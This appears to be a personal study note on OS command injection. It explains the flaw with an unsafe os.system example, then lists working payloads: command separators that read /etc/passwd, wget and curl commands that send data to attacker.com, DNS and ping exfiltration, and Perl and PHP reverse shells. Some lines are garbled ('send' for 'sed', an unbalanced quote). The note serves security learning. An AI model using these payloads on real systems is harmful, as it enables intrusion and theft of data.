---
title: Command Injection
draft:
tags:
---
![[Pasted image 20260811164040.png]]

> [!info]  Command Injection
> 
> 
> OS Command Injection occurs when a web application passes attacker-controlled input to the operating system shell without properly validating or safely handling that input.
> 
> In this vulnerability, the application normally generates or executes an operating system command using data supplied by the client. If that input is incorporated into the command unsafely, an attacker may be able to inject additional shell commands that are executed by the server.
> 
> In simple terms:
> 
> ```text
> Untrusted User Input
>         ↓
> Web Application
>         ↓
> Operating System Shell
>         ↓
> Injected Command Execution
> ```
> 
> For example, an application may expect a user to provide a filename:
> 
> ```text
> filename = report.txt
> ```
> 
> and construct a command such as:
> 
> ```bash
> cat report.txt
> ```
> 
> If the application directly places untrusted input into a shell command, an attacker may manipulate the input so that additional commands are interpreted by the shell.
> 
> The core security problem is therefore:
> 
> ```text
> Attacker-Controlled Input
>            +
> Unsafe Shell Command Construction
>            =
> OS Command Injection
> ```
> 
> The impact can be severe because the injected command executes with the privileges of the vulnerable application or operating-system process.
> 
> Depending on the application's privileges and environment, successful command injection may result in:
> 
> - Arbitrary command execution
>     
> - Reading sensitive files
>     
> - Modifying or deleting data
>     
> - Access to environment secrets
>     
> - Network access from the server
>     
> - Privilege escalation through subsequent attacks
>     
> - Full server compromise
>     
> 
> **OS Command Injection is commonly considered a Critical-severity vulnerability when arbitrary command execution is possible.**

![[Pasted image 20260516180351.png]]

But why web application need to interact with shell? there are many scenarios:
- Converting an image
- Calling External web service
- Converting video
- Calling a binary

> [!Example]+ video_name comes from user input
> ```
> os.system("/bin/ffmpeg -i {} -c:a copy -c:v vp9 -r 30 /files/user/{}/videos".format(video_name,session.get('user_id')))
>```

####  Phase  0x01 Detection

the detection phase is about to fuzz the suspicious input,there are some command separators, a useful list can be found here

> [!danger] Payload 0x01
> ```bash
> ; cat /etc/passwd
> && cat /etc/passwd
> | cat /etc/passwd
> || cat /etc/passwd
> `cat /etc/passwd
> $(cat /etc/passwd)
> {cat,/etc/passwd}
> cat$IFS/etc/passwd
> cat $(HOME:0:1)etc$(HOME:0:1)passwd
> ```

#### OOB Technique

Out-of-band technique in command injection involves the attacker's ability to send data outside the application's normal communication channels. this can be done through DNS requests, HTTPS requests, or other means. 
the attacker can then use this channel to receive data from exploited  system, such as the output of a command executed through the command injection vulnerability. this technique can useful when the application does not return the output of the injected command, or when the output is not easily accessible by attacker.

> [!info] Payload 0x02
> ```bash
> ; wget http://attacker.com/OOB
> && wget http://attacker.com/OOB
> | wget http://attacker.com/OOB
> || wget http://attacker.com/OOB
> `wget http://attacker.com/OOB
> $(wget http://attacker.com/OOB)
> {wget,http://attacker.com/OOB}
> ```

In the normal mode, the data can be grabbed easily. However, in the blind mode,OOB techneque should be used
- HTTP data Exfiltration
- DNS data Exfiltration

in order for HTTP Exfiltration, any program can be used, such curl, wget, etc...
Data should be sent out to attacker server 

> [!example] 
> ```bash
> curl http://attacker.com -d "$(id)"
> ```
> ```bash
> curl http://attacker.com --data-binary @/etc/passwd
> ```

In order for HTTP exfiltration any program that can send ICMP packet is useful, such as ping, host and etc...
Data should be sent out to the attacker server

>[!example]
>```bash
>dig a +short $(whoami).attacker.com #
>```
>```bash
>uname -a | od -A n -t x1 | send 's/ *//g' | while read exfil; do ping -c 1 $exfil.attacker.com; done
>```
>```bash
>echo "hexinput" | xxd -r -p
>```

# Reverse Shell

HTTP Is an stateless protocol, in the Command Injection, attackers execute command on a non-interactive shell

An interactive shell can be achieved through 2 ways
- spawning a shell and bind it on a port in target machine, connecting to it directly (nowadays is impossible, why?)
- Using a reverse shell forcing target machine to connect back to attacking machine

Procedure
- Attacker's Machine listens on a port
- Victim's machine connects to the port
- Victim's spawn a shell
- Attacker will have the shell

> [!Example]
> ```perl
> perl -e 'use Socket;$i="IP;$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDER,">&S");exec("/bin/bash -i");};'
> ```
> ```php
> php -r '$sock=fsockopen("IP",PORT);exec("sh <&3 >&3 2>&3");'
> ```

resource : [RevShell](https://www.revshells.com)


## Commix

Is an open source penetration testing tool, Automates the detection and exploitation of Command Injection vulnerabilities. [WebSite](https://commixproject.com)

>[!Danger] Commix 
> ```python
> python3 commix.py -r packet.burp -p var
> ```